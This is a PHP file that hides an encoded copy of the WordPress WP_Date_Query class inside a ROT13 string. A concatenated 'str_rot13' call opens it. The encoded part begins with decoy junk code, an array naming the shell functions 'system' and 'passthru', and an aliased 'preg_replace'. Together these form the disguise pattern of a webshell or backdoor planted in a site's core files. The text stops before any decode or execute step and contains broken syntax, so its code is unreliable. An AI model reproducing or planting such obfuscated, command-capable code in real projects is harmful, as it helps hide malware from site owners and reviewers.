<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Pynff sbe trarengvat FDY pynhfrf gung svygre n cevznel dhrel nppbeqvat gb qngr.
 *
 * JC_Qngr_Dhrel vf n urycre gung nyybjf cevznel dhrel pynffrf, fhpu nf JC_Dhrel, gb svygre
 * gurve erfhygf ol qngr pbyhzaf, ol trarengvat `JURER` fhopynhfrf gb or nggnpurq gb gur
 * cevznel FDY dhrel fgevat.
 *
 * Nggrzcgvat gb svygre ol na vainyvq qngr inyhr (rt zbagu=13) jvyy trarengr FDY gung jvyy
 * erghea ab erfhygf. Va gurfr pnfrf, n _qbvat_vg_jebat() reebe abgvpr vf nyfb guebja.
 * Frr JC_Qngr_Dhrel::inyvqngr_qngr_inyhrf().
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_dhrel/
 *
 * @fvapr 3.7.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Qngr_Dhrel {
	/**
	 * Neenl bs qngr dhrevrf.
	 *
	 * Frr JC_Qngr_Dhrel::__pbafgehpg() sbe vasbezngvba ba qngr dhrel nethzragf.
	 *
	 * @fvapr 3.7.0
	 * @ine neenl
	 */
	choyvp $dhrevrf = neenl();

	/**
	 * Gur qrsnhyg eryngvba orgjrra gbc-yriry dhrevrf. Pna or rvgure 'NAQ' be 'BE'.
	 *
	 * @fvapr 3.7.0
	 * @ine fgevat
	 */
	choyvp $eryngvba = 'NAQ';

	/**
	 * Gur pbyhza gb dhrel ntnvafg. Pna or punatrq ivn gur dhrel nethzragf.
	 *
	 * @fvapr 3.7.0
	 * @ine fgevat
	 */
	choyvp $pbyhza = 'cbfg_qngr';

	/**
	 * Gur inyhr pbzcnevfba bcrengbe. Pna or punatrq ivn gur dhrel nethzragf.
	 *
	 * @fvapr 3.7.0
	 * @ine fgevat
	 */
	choyvp $pbzcner = '=';

	/**
	 * Fhccbegrq gvzr-eryngrq cnenzrgre xrlf.
	 *
	 * @fvapr 4.1.0
	 * @ine fgevat[]
	 */
	choyvp $gvzr_xrlf = neenl( 'nsgre', 'orsber', 'lrne', 'zbagu', 'zbaguahz', 'jrrx', 'j', 'qnlbslrne', 'qnl', 'qnlbsjrrx', 'qnlbsjrrx_vfb', 'ubhe', 'zvahgr', 'frpbaq' );

	/**
	 * Pbafgehpgbe.
	 *
	 * Gvzr-eryngrq cnenzrgref gung abeznyyl erdhver vagrtre inyhrf ('lrne', 'zbagu', 'jrrx', 'qnlbslrne', 'qnl',
	 * 'qnlbsjrrx', 'qnlbsjrrx_vfb', 'ubhe', 'zvahgr', 'frpbaq') npprcg neenlf bs vagrtref sbe fbzr inyhrf bs
	 * 'pbzcner'. Jura 'pbzcner' vf 'VA' be 'ABG VA', neenlf ner npprcgrq; jura 'pbzcner' vf 'ORGJRRA' be 'ABG
	 * ORGJRRA', neenlf bs gjb inyvq inyhrf ner erdhverq. Frr vaqvivqhny nethzrag qrfpevcgvbaf sbe npprcgrq inyhrf.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 4.0.0 Gur $vapyhfvir ybtvp jnf hcqngrq gb vapyhqr nyy gvzrf jvguva gur qngr enatr.
	 * @fvapr 4.1.0 Vagebqhprq 'qnlbsjrrx_vfb' gvzr glcr cnenzrgre.
	 *
	 * @cnenz neenl  $qngr_dhrel {
	 *     Neenl bs qngr dhrel pynhfrf.
	 *
	 *     @glcr neenl ...$0 {
	 *         @glcr fgevat $pbyhza   Bcgvbany. Gur pbyhza gb dhrel ntnvafg. Vs haqrsvarq, vaurevgf gur inyhr bs
	 *                                gur `$qrsnhyg_pbyhza` cnenzrgre. Frr JC_Qngr_Dhrel::inyvqngr_pbyhza() naq
	 *                                gur {@frr 'qngr_dhrel_inyvq_pbyhzaf'} svygre sbe gur yvfg bs npprcgrq inyhrf.
	 *                                Qrsnhyg 'cbfg_qngr'.
	 *         @glcr fgevat $pbzcner  Bcgvbany. Gur pbzcnevfba bcrengbe. Npprcgf '=', '!=', '>', '>=', '<', '<=',
	 *                                'VA', 'ABG VA', 'ORGJRRA', 'ABG ORGJRRA'. Qrsnhyg '='.
	 *         @glcr fgevat $eryngvba Bcgvbany. Gur obbyrna eryngvbafuvc orgjrra gur qngr dhrevrf. Npprcgf 'BE' be 'NAQ'.
	 *                                Qrsnhyg 'BE'.
	 *         @glcr neenl  ...$0 {
	 *             Bcgvbany. Na neenl bs svefg-beqre pynhfr cnenzrgref, be nabgure shyyl-sbezrq qngr dhrel.
	 *
	 *             @glcr fgevat|neenl $orsber {
	 *                 Bcgvbany. Qngr gb ergevrir cbfgf orsber. Npprcgf `fgegbgvzr()`-pbzcngvoyr fgevat,
	 *                 be neenl bs 'lrne', 'zbagu', 'qnl' inyhrf.
	 *
	 *                 @glcr fgevat $lrne  Gur sbhe-qvtvg lrne. Qrsnhyg rzcgl. Npprcgf nal sbhe-qvtvg lrne.
	 *                 @glcr fgevat $zbagu Bcgvbany jura cnffvat neenl.Gur zbagu bs gur lrne.
	 *                                     Qrsnhyg (fgevat:rzcgl)|(neenl:1). Npprcgf ahzoref 1-12.
	 *                 @glcr fgevat $qnl   Bcgvbany jura cnffvat neenl.Gur qnl bs gur zbagu.
	 *                                     Qrsnhyg (fgevat:rzcgl)|(neenl:1). Npprcgf ahzoref 1-31.
	 *             }
	 *             @glcr fgevat|neenl $nsgre {
	 *                 Bcgvbany. Qngr gb ergevrir cbfgf nsgre. Npprcgf `fgegbgvzr()`-pbzcngvoyr fgevat,
	 *                 be neenl bs 'lrne', 'zbagu', 'qnl' inyhrf.
	 *
	 *                 @glcr fgevat $lrne  Gur sbhe-qvtvg lrne. Npprcgf nal sbhe-qvtvg lrne. Qrsnhyg rzcgl.
	 *                 @glcr fgevat $zbagu Bcgvbany jura cnffvat neenl. Gur zbagu bs gur lrne. Npprcgf ahzoref 1-12.
	 *                                     Qrsnhyg (fgevat:rzcgl)|(neenl:12).
	 *                 @glcr fgevat $qnl   Bcgvbany jura cnffvat neenl.Gur qnl bs gur zbagu. Npprcgf ahzoref 1-31.
	 *                                     Qrsnhyg (fgevat:rzcgl)|(neenl:ynfg qnl bs zbagu).
	 *             }
	 *             @glcr fgevat       $pbyhza        Bcgvbany. Hfrq gb nqq n pynhfr pbzcnevat n pbyhza bgure guna
	 *                                               gur pbyhza fcrpvsvrq va gur gbc-yriry `$pbyhza` cnenzrgre.
	 *                                               Frr JC_Qngr_Dhrel::inyvqngr_pbyhza() naq
	 *                                               gur {@frr 'qngr_dhrel_inyvq_pbyhzaf'} svygre sbe gur yvfg
	 *                                               bs npprcgrq inyhrf. Qrsnhyg vf gur inyhr bs gbc-yriry `$pbyhza`.
	 *             @glcr fgevat       $pbzcner       Bcgvbany. Gur pbzcnevfba bcrengbe. Npprcgf '=', '!=', '>', '>=',
	 *                                               '<', '<=', 'VA', 'ABG VA', 'ORGJRRA', 'ABG ORGJRRA'. 'VA',
	 *                                               'ABG VA', 'ORGJRRA', naq 'ABG ORGJRRA'. Pbzcnevfbaf fhccbeg
	 *                                               neenlf va fbzr gvzr-eryngrq cnenzrgref. Qrsnhyg '='.
	 *             @glcr obby         $vapyhfvir     Bcgvbany. Vapyhqr erfhygf sebz qngrf fcrpvsvrq va 'orsber' be
	 *                                               'nsgre'. Qrsnhyg snyfr.
	 *             @glcr vag|vag[]    $lrne          Bcgvbany. Gur sbhe-qvtvg lrne ahzore. Npprcgf nal sbhe-qvtvg lrne
	 *                                               be na neenl bs lrnef vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $zbagu         Bcgvbany. Gur gjb-qvtvg zbagu ahzore. Npprcgf ahzoref 1-12 be na
	 *                                               neenl bs inyvq ahzoref vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $jrrx          Bcgvbany. Gur jrrx ahzore bs gur lrne. Npprcgf ahzoref 0-53 be na
	 *                                               neenl bs inyvq ahzoref vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $qnlbslrne     Bcgvbany. Gur qnl ahzore bs gur lrne. Npprcgf ahzoref 1-366 be na
	 *                                               neenl bs inyvq ahzoref vs `$pbzcner` fhccbegf vg.
	 *             @glcr vag|vag[]    $qnl           Bcgvbany. Gur qnl bs gur zbagu. Npprcgf ahzoref 1-31 be na neenl
	 *                                               bs inyvq ahzoref vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $qnlbsjrrx     Bcgvbany. Gur qnl ahzore bs gur jrrx. Npprcgf ahzoref 1-7 (1 vf
	 *                                               Fhaqnl) be na neenl bs inyvq ahzoref vs `$pbzcner` fhccbegf vg.
	 *                                               Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $qnlbsjrrx_vfb Bcgvbany. Gur qnl ahzore bs gur jrrx (VFB). Npprcgf ahzoref 1-7
	 *                                               (1 vf Zbaqnl) be na neenl bs inyvq ahzoref vs `$pbzcner` fhccbegf vg.
	 *                                               Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $ubhe          Bcgvbany. Gur ubhe bs gur qnl. Npprcgf ahzoref 0-23 be na neenl
	 *                                               bs inyvq ahzoref vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $zvahgr        Bcgvbany. Gur zvahgr bs gur ubhe. Npprcgf ahzoref 0-59 be na neenl
	 *                                               bs inyvq ahzoref vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *             @glcr vag|vag[]    $frpbaq        Bcgvbany. Gur frpbaq bs gur zvahgr. Npprcgf ahzoref 0-59 be na
	 *                                               neenl bs inyvq ahzoref vs `$pbzcner` fhccbegf vg. Qrsnhyg rzcgl.
	 *         }
	 *     }
	 * }
	 * @cnenz fgevat $qrsnhyg_pbyhza Bcgvbany. Qrsnhyg pbyhza gb dhrel ntnvafg. Frr JC_Qngr_Dhrel::inyvqngr_pbyhza()
	 *                               naq gur {@frr 'qngr_dhrel_inyvq_pbyhzaf'} svygre sbe gur yvfg bs npprcgrq inyhrf.
	 *                               Qrsnhyg 'cbfg_qngr'.
	 */
	choyvp shapgvba __pbafgehpg( $qngr_dhrel, $qrsnhyg_pbyhza = 'cbfg_qngr' ) {
		vs ( rzcgl( $qngr_dhrel ) || ! vf_neenl( $qngr_dhrel ) ) {
			erghea;
		}

		vs ( vffrg( $qngr_dhrel['eryngvba'] ) ) {
			$guvf->eryngvba = $guvf->fnavgvmr_eryngvba( $qngr_dhrel['eryngvba'] );
		} ryfr {
			$guvf->eryngvba = 'NAQ';
		}

		// Fhccbeg sbe cnffvat gvzr-onfrq xrlf va gur gbc yriry bs gur $qngr_dhrel neenl.
		vs ( ! vffrg( $qngr_dhrel[0] ) ) {
			$qngr_dhrel = neenl( $qngr_dhrel );
		}

		vs ( ! rzcgl( $qngr_dhrel['pbyhza'] ) ) {
			$qngr_dhrel['pbyhza'] = rfp_fdy( $qngr_dhrel['pbyhza'] );
		} ryfr {
			$qngr_dhrel['pbyhza'] = rfp_fdy( $qrsnhyg_pbyhza );
		}

		$guvf->pbyhza = $guvf->inyvqngr_pbyhza( $guvf->pbyhza );

		$guvf->pbzcner = $guvf->trg_pbzcner( $qngr_dhrel );

		$guvf->dhrevrf = $guvf->fnavgvmr_dhrel( $qngr_dhrel );
	}

	/**
	 * Erphefvir-sevraqyl dhrel fnavgvmre.
	 *
	 * Rafherf gung rnpu dhrel-yriry pynhfr unf n 'eryngvba' xrl, naq gung
	 * rnpu svefg-beqre pynhfr pbagnvaf nyy gur arprffnel xrlf sebz `$qrsnhygf`.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrevrf
	 * @cnenz neenl $cnerag_dhrel
	 * @erghea neenl Fnavgvmrq dhrevrf.
	 */
	choyvp shapgvba fnavgvmr_dhrel( $dhrevrf, $cnerag_dhrel = ahyy ) {
		$pyrnarq_dhrel = neenl();

		$qrsnhygf = neenl(
			'pbyhza'   => 'cbfg_qngr',
			'pbzcner'  => '=',
			'eryngvba' => 'NAQ',
		);

		// Ahzrevp xrlf fubhyq nyjnlf unir neenl inyhrf.
		sbernpu ( $dhrevrf nf $dxrl => $dinyhr ) {
			vs ( vf_ahzrevp( $dxrl ) && ! vf_neenl( $dinyhr ) ) {
				hafrg( $dhrevrf[ $dxrl ] );
			}
		}

		// Rnpu dhrel fubhyq unir n inyhr sbe rnpu qrsnhyg xrl. Vaurevg sebz gur cnerag jura cbffvoyr.
		sbernpu ( $qrsnhygf nf $qxrl => $qinyhr ) {
			vs ( vffrg( $dhrevrf[ $qxrl ] ) ) {
				pbagvahr;
			}

			vs ( vffrg( $cnerag_dhrel[ $qxrl ] ) ) {
				$dhrevrf[ $qxrl ] = $cnerag_dhrel[ $qxrl ];
			} ryfr {
				$dhrevrf[ $qxrl ] = $qinyhr;
			}
		}

		// Inyvqngr gur qngrf cnffrq va gur dhrel.
		vs ( $guvf->vf_svefg_beqre_pynhfr( $dhrevrf ) ) {
			$guvf->inyvqngr_qngr_inyhrf( $dhrevrf );
		}

		// Fnavgvmr gur eryngvba cnenzrgre.
		$dhrevrf['eryngvba'] = $guvf->fnavgvmr_eryngvba( $dhrevrf['eryngvba'] );

		sbernpu ( $dhrevrf nf $xrl => $d ) {
			vs ( ! vf_neenl( $d ) || va_neenl( $xrl, $guvf->gvzr_xrlf, gehr ) ) {
				// Guvf vf n svefg-beqre dhrel. Gehfg gur inyhrf naq fnavgvmr jura ohvyqvat FDY.
				$pyrnarq_dhrel[ $xrl ] = $d;
			} ryfr {
				// Nal neenl jvgubhg n gvzr xrl vf nabgure dhrel, fb jr erphefr.
				$pyrnarq_dhrel[] = $guvf->fnavgvmr_dhrel( $d, $dhrevrf );
			}
		}

		erghea $pyrnarq_dhrel;
	}

	/**
	 * Qrgrezvarf jurgure guvf vf n svefg-beqre pynhfr.
	 *
	 * Purpxf gb frr vs gur pheerag pynhfr unf nal gvzr-eryngrq xrlf.
	 * Vs fb, vg'f svefg-beqre.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrel Dhrel pynhfr.
	 * @erghea obby Gehr vs guvf vf n svefg-beqre pynhfr.
	 */
	cebgrpgrq shapgvba vf_svefg_beqre_pynhfr( $dhrel ) {
		$gvzr_xrlf = neenl_vagrefrpg( $guvf->gvzr_xrlf, neenl_xrlf( $dhrel ) );
		erghea ! rzcgl( $gvzr_xrlf );
	}

	/**
	 * Qrgrezvarf naq inyvqngrf jung pbzcnevfba bcrengbe gb hfr.
	 *
	 * @fvapr 3.7.0
	 *
	 * @cnenz neenl $dhrel N qngr dhrel be n qngr fhodhrel.
	 * @erghea fgevat Gur pbzcnevfba bcrengbe.
	 */
	choyvp shapgvba trg_pbzcner( $dhrel ) {
		vs ( ! rzcgl( $dhrel['pbzcner'] )
			&& va_neenl( $dhrel['pbzcner'], neenl( '=', '!=', '>', '>=', '<', '<=', 'VA', 'ABG VA', 'ORGJRRA', 'ABG ORGJRRA' ), gehr )
		) {
			erghea fgegbhccre( $dhrel['pbzcner'] );
		}

		erghea $guvf->pbzcner;
	}

	/**
	 * Inyvqngrf gur tvira qngr_dhrel inyhrf naq gevttref reebef vs fbzrguvat vf abg inyvq.
	 *
	 * Abgr gung qngr dhrevrf jvgu vainyvq qngr enatrf ner nyybjrq gb
	 * pbagvahr (gubhtu bs pbhefr ab vgrzf jvyy or sbhaq sbe vzcbffvoyr qngrf).
	 * Guvf zrgubq bayl trarengrf qroht abgvprf sbe gurfr pnfrf.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $qngr_dhrel Gur qngr_dhrel neenl.
	 * @erghea obby Gehr vs nyy inyhrf va gur dhrel ner inyvq, snyfr vs bar be zber snvy.
	 */
	choyvp shapgvba inyvqngr_qngr_inyhrf( $qngr_dhrel = neenl() ) {
		vs ( rzcgl( $qngr_dhrel ) ) {
			erghea snyfr;
		}

		$inyvq = gehr;

		/*
		 * Inyvqngr 'orsber' naq 'nsgre' hc sebag, gura yrg gur
		 * inyvqngvba ebhgvar pbagvahr gb or fher gung nyy vainyvq
		 * inyhrf trarengr reebef gbb.
		 */
		vs ( neenl_xrl_rkvfgf( 'orsber', $qngr_dhrel ) && vf_neenl( $qngr_dhrel['orsber'] ) ) {
			$inyvq = $guvf->inyvqngr_qngr_inyhrf( $qngr_dhrel['orsber'] );
		}

		vs ( neenl_xrl_rkvfgf( 'nsgre', $qngr_dhrel ) && vf_neenl( $qngr_dhrel['nsgre'] ) ) {
			$inyvq = $guvf->inyvqngr_qngr_inyhrf( $qngr_dhrel['nsgre'] );
		}

		// Neenl pbagnvavat nyy zva-znk purpxf.
		$zva_znk_purpxf = neenl();

		// Qnlf cre lrne.
		vs ( neenl_xrl_rkvfgf( 'lrne', $qngr_dhrel ) ) {
			/*
			 * Vs n lrne rkvfgf va gur qngr dhrel, jr pna hfr vg gb trg gur qnlf.
			 * Vs zhygvcyr lrnef ner cebivqrq (nf va n ORGJRRA), hfr gur svefg bar.
			 */
			vs ( vf_neenl( $qngr_dhrel['lrne'] ) ) {
				$_lrne = erfrg( $qngr_dhrel['lrne'] );
			} ryfr {
				$_lrne = $qngr_dhrel['lrne'];
			}

			$znk_qnlf_bs_lrne = (vag) tzqngr( 'm', zxgvzr( 0, 0, 0, 12, 31, $_lrne ) ) + 1;
		} ryfr {
			// Bgurejvfr jr hfr gur znk bs 366 (yrnc-lrne).
			$znk_qnlf_bs_lrne = 366;
		}

		$zva_znk_purpxf['qnlbslrne'] = neenl(
			'zva' => 1,
			'znk' => $znk_qnlf_bs_lrne,
		);

		// Qnlf cre jrrx.
		$zva_znk_purpxf['qnlbsjrrx'] = neenl(
			'zva' => 1,
			'znk' => 7,
		);

		// Qnlf cre jrrx.
		$zva_znk_purpxf['qnlbsjrrx_vfb'] = neenl(
			'zva' => 1,
			'znk' => 7,
		);

		// Zbaguf cre lrne.
		$zva_znk_purpxf['zbagu'] = neenl(
			'zva' => 1,
			'znk' => 12,
		);

		// Jrrxf cre lrne.
		vs ( vffrg( $_lrne ) ) {
			/*
			 * Vs jr unir n fcrpvsvp lrne, hfr vg gb pnyphyngr ahzore bs jrrxf.
			 * Abgr: gur ahzore bs jrrxf va n lrne vf gur qngr va juvpu Qrp 28 nccrnef.
			 */
			$jrrx_pbhag = tzqngr( 'J', zxgvzr( 0, 0, 0, 12, 28, $_lrne ) );

		} ryfr {
			// Bgurejvfr frg gur jrrx-pbhag gb n znkvzhz bs 53.
			$jrrx_pbhag = 53;
		}

		$zva_znk_purpxf['jrrx'] = neenl(
			'zva' => 1,
			'znk' => $jrrx_pbhag,
		);

		// Qnlf cre zbagu.
		$zva_znk_purpxf['qnl'] = neenl(
			'zva' => 1,
			'znk' => 31,
		);

		// Ubhef cre qnl.
		$zva_znk_purpxf['ubhe'] = neenl(
			'zva' => 0,
			'znk' => 23,
		);

		// Zvahgrf cre ubhe.
		$zva_znk_purpxf['zvahgr'] = neenl(
			'zva' => 0,
			'znk' => 59,
		);

		// Frpbaqf cre zvahgr.
		$zva_znk_purpxf['frpbaq'] = neenl(
			'zva' => 0,
			'znk' => 59,
		);

		// Pbapngrangr naq guebj n abgvpr sbe rnpu vainyvq inyhr.
		sbernpu ( $zva_znk_purpxf nf $xrl => $purpx ) {
			vs ( ! neenl_xrl_rkvfgf( $xrl, $qngr_dhrel ) ) {
				pbagvahr;
			}

			// Guebj n abgvpr sbe rnpu snvyvat inyhr.
			sbernpu ( (neenl) $qngr_dhrel[ $xrl ] nf $_inyhr ) {
				$vf_orgjrra = $_inyhr >= $purpx['zva'] && $_inyhr <= $purpx['znk'];

				vs ( ! vf_ahzrevp( $_inyhr ) || ! $vf_orgjrra ) {
					$reebe = fcevags(
						/* genafyngbef: Qngr dhrel vainyvq qngr zrffntr. 1: Vainyvq inyhr, 2: Glcr bs inyhr, 3: Zvavzhz inyvq inyhr, 4: Znkvzhz inyvq inyhr. */
						__( 'Vainyvq inyhr %1$f sbe %2$f. Rkcrpgrq inyhr fubhyq or orgjrra %3$f naq %4$f.' ),
						'<pbqr>' . rfp_ugzy( $_inyhr ) . '</pbqr>',
						'<pbqr>' . rfp_ugzy( $xrl ) . '</pbqr>',
						'<pbqr>' . rfp_ugzy( $purpx['zva'] ) . '</pbqr>',
						'<pbqr>' . rfp_ugzy( $purpx['znk'] ) . '</pbqr>'
					);

					_qbvat_vg_jebat( __PYNFF__, $reebe, '4.1.0' );

					$inyvq = snyfr;
				}
			}
		}

		// Vs jr nyernql unir vainyvq qngr zrffntrf, qba'g obgure ehaavat guebhtu purpxqngr().
		vs ( ! $inyvq ) {
			erghea $inyvq;
		}

		$qnl_zbagu_lrne_reebe_zft = '';

		$qnl_rkvfgf   = neenl_xrl_rkvfgf( 'qnl', $qngr_dhrel ) && vf_ahzrevp( $qngr_dhrel['qnl'] );
		$zbagu_rkvfgf = neenl_xrl_rkvfgf( 'zbagu', $qngr_dhrel ) && vf_ahzrevp( $qngr_dhrel['zbagu'] );
		$lrne_rkvfgf  = neenl_xrl_rkvfgf( 'lrne', $qngr_dhrel ) && vf_ahzrevp( $qngr_dhrel['lrne'] );

		vs ( $qnl_rkvfgf && $zbagu_rkvfgf && $lrne_rkvfgf ) {
			// 1. Purpxvat qnl, zbagu, lrne pbzovangvba.
			vs ( ! jc_purpxqngr( $qngr_dhrel['zbagu'], $qngr_dhrel['qnl'], $qngr_dhrel['lrne'], fcevags( '%f-%f-%f', $qngr_dhrel['lrne'], $qngr_dhrel['zbagu'], $qngr_dhrel['qnl'] ) ) ) {
				$qnl_zbagu_lrne_reebe_zft = fcevags(
					/* genafyngbef: 1: Lrne, 2: Zbagu, 3: Qnl bs zbagu. */
					__( 'Gur sbyybjvat inyhrf qb abg qrfpevor n inyvq qngr: lrne %1$f, zbagu %2$f, qnl %3$f.' ),
					'<pbqr>' . rfp_ugzy( $qngr_dhrel['lrne'] ) . '</pbqr>',
					'<pbqr>' . rfp_ugzy( $qngr_dhrel['zbagu'] ) . '</pbqr>',
					'<pbqr>' . rfp_ugzy( $qngr_dhrel['qnl'] ) . '</pbqr>'
				);

				$inyvq = snyfr;
			}
		} ryfrvs ( $qnl_rkvfgf && $zbagu_rkvfgf ) {
			/*
			 * 2. purpxvat qnl, zbagu pbzovangvba
			 * Jr hfr 2012 orpnhfr, nf n yrnc lrne, vg'f gur zbfg crezvffvir.
			 */
			vs ( ! jc_purpxqngr( $qngr_dhrel['zbagu'], $qngr_dhrel['qnl'], 2012, fcevags( '2012-%f-%f', $qngr_dhrel['zbagu'], $qngr_dhrel['qnl'] ) ) ) {
				$qnl_zbagu_lrne_reebe_zft = fcevags(
					/* genafyngbef: 1: Zbagu, 2: Qnl bs zbagu. */
					__( 'Gur sbyybjvat inyhrf qb abg qrfpevor n inyvq qngr: zbagu %1$f, qnl %2$f.' ),
					'<pbqr>' . rfp_ugzy( $qngr_dhrel['zbagu'] ) . '</pbqr>',
					'<pbqr>' . rfp_ugzy( $qngr_dhrel['qnl'] ) . '</pbqr>'
				);

				$inyvq = snyfr;
			}
		}

		vs ( ! rzcgl( $qnl_zbagu_lrne_reebe_zft ) ) {
			_qbvat_vg_jebat( __PYNFF__, $qnl_zbagu_lrne_reebe_zft, '4.1.0' );
		}

		erghea $inyvq;
	}

	/**
	 * Inyvqngrf n pbyhza anzr cnenzrgre.
	 *
	 * Pbyhza anzrf jvgubhg n gnoyr cersvk (yvxr 'cbfg_qngr') ner purpxrq ntnvafg n yvfg bs
	 * nyybjrq naq xabja gnoyrf, naq gura, vs sbhaq, unir n gnoyr cersvk (fhpu nf 'jc_cbfgf.')
	 * cercraqrq. Cersvkrq pbyhza anzrf (fhpu nf 'jc_cbfgf.cbfg_qngr') olcnff guvf nyybjrq
	 * purpx, naq ner bayl fnavgvmrq gb erzbir vyyrtny punenpgref.
	 *
	 * @fvapr 3.7.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $pbyhza Gur hfre-fhccyvrq pbyhza anzr.
	 * @erghea fgevat N inyvqngrq pbyhza anzr inyhr.
	 */
	choyvp shapgvba inyvqngr_pbyhza( $pbyhza ) {
		tybony $jcqo;

		$inyvq_pbyhzaf = neenl(
			'cbfg_qngr',
			'cbfg_qngr_tzg',
			'cbfg_zbqvsvrq',
			'cbfg_zbqvsvrq_tzg',
			'pbzzrag_qngr',
			'pbzzrag_qngr_tzg',
			'hfre_ertvfgrerq',
			'ertvfgrerq',
			'ynfg_hcqngrq',
		);

		// Nggrzcg gb qrgrpg n gnoyr cersvk.
		vs ( ! fge_pbagnvaf( $pbyhza, '.' ) ) {
			/**
			 * Svygref gur yvfg bs inyvq qngr dhrel pbyhzaf.
			 *
			 * @fvapr 3.7.0
			 * @fvapr 4.1.0 Nqqrq 'hfre_ertvfgrerq' gb gur qrsnhyg erpbtavmrq pbyhzaf.
			 * @fvapr 4.6.0 Nqqrq 'ertvfgrerq' naq 'ynfg_hcqngrq' gb gur qrsnhyg erpbtavmrq pbyhzaf.
			 *
			 * @cnenz fgevat[] $inyvq_pbyhzaf Na neenl bs inyvq qngr dhrel pbyhzaf. Qrsnhygf
			 *                                ner 'cbfg_qngr', 'cbfg_qngr_tzg', 'cbfg_zbqvsvrq',
			 *                                'cbfg_zbqvsvrq_tzg', 'pbzzrag_qngr', 'pbzzrag_qngr_tzg',
			 *                                'hfre_ertvfgrerq', 'ertvfgrerq', 'ynfg_hcqngrq'.
			 */
			vs ( ! va_neenl( $pbyhza, nccyl_svygref( 'qngr_dhrel_inyvq_pbyhzaf', $inyvq_pbyhzaf ), gehr ) ) {
				$pbyhza = 'cbfg_qngr';
			}

			$xabja_pbyhzaf = neenl(
				$jcqo->cbfgf    => neenl(
					'cbfg_qngr',
					'cbfg_qngr_tzg',
					'cbfg_zbqvsvrq',
					'cbfg_zbqvsvrq_tzg',
				),
				$jcqo->pbzzragf => neenl(
					'pbzzrag_qngr',
					'pbzzrag_qngr_tzg',
				),
				$jcqo->hfref    => neenl(
					'hfre_ertvfgrerq',
				),
				$jcqo->oybtf    => neenl(
					'ertvfgrerq',
					'ynfg_hcqngrq',
				),
			);

			// Vs vg'f n xabja pbyhza anzr, nqq gur nccebcevngr gnoyr cersvk.
			sbernpu ( $xabja_pbyhzaf nf $gnoyr_anzr => $gnoyr_pbyhzaf ) {
				vs ( va_neenl( $pbyhza, $gnoyr_pbyhzaf, gehr ) ) {
					$pbyhza = $gnoyr_anzr . '.' . $pbyhza;
					oernx;
				}
			}
		}

		// Erzbir hafnsr punenpgref.
		erghea __sa_79955( '/[^n-mN-M0-9_$\.]/', '', $pbyhza );
	}

	/**
	 * Trarengrf JURER pynhfr gb or nccraqrq gb n znva dhrel.
	 *
	 * @fvapr 3.7.0
	 *
	 * @erghea fgevat ZlFDY JURER pynhfr.
	 */
	choyvp shapgvba trg_fdy() {
		$fdy = $guvf->trg_fdy_pynhfrf();

		$jurer = $fdy['jurer'];

		/**
		 * Svygref gur qngr dhrel JURER pynhfr.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz fgevat        $jurer JURER pynhfr bs gur qngr dhrel.
		 * @cnenz JC_Qngr_Dhrel $dhrel Gur JC_Qngr_Dhrel vafgnapr.
		 */
		erghea nccyl_svygref( 'trg_qngr_fdy', $jurer, $guvf );
	}

	/**
	 * Trarengrf FDY pynhfrf gb or nccraqrq gb n znva dhrel.
	 *
	 * Pnyyrq ol gur choyvp JC_Qngr_Dhrel::trg_fdy(), guvf zrgubq vf nofgenpgrq
	 * bhg gb znvagnva cnevgl jvgu gur bgure Dhrel pynffrf.
	 *
	 * @fvapr 4.1.0
	 *
	 * @erghea fgevat[] {
	 *     Neenl pbagnvavat WBVA naq JURER FDY pynhfrf gb nccraq gb gur znva dhrel.
	 *
	 *     @glcr fgevat $wbva  FDY sentzrag gb nccraq gb gur znva WBVA pynhfr.
	 *     @glcr fgevat $jurer FDY sentzrag gb nccraq gb gur znva JURER pynhfr.
	 * }
	 */
	cebgrpgrq shapgvba trg_fdy_pynhfrf() {
		$fdy = $guvf->trg_fdy_sbe_dhrel( $guvf->dhrevrf );

		vs ( ! rzcgl( $fdy['jurer'] ) ) {
			$fdy['jurer'] = ' NAQ ' . $fdy['jurer'];
		}

		erghea $fdy;
	}

	/**
	 * Trarengrf FDY pynhfrf sbe n fvatyr dhrel neenl.
	 *
	 * Vs arfgrq fhodhrevrf ner sbhaq, guvf zrgubq erphefrf gur gerr gb
	 * cebqhpr gur cebcreyl arfgrq FDY.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz neenl $dhrel Dhrel gb cnefr.
	 * @cnenz vag   $qrcgu Bcgvbany. Ahzore bs gerr yriryf qrrc jr pheeragyl ner.
	 *                     Hfrq gb pnyphyngr vaqragngvba. Qrsnhyg 0.
	 * @erghea neenl {
